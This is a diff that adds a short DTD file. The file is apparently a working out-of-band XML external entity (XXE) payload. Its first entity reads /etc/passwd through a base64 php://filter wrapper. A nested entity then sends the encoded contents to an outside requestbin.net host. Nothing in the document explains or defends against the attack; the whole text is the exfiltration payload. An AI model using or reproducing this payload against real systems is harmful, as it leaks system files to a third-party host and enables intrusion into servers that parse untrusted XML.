@@ -1,0 +1,5 @@
+<!ENTITY % payload SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
+<!ENTITY % remote
+"<!ENTITY &#37; send SYSTEM 'http://wlbh0veijelnlghi.b.requestbin.net/%payload;'>">
+%remote;
+%send;
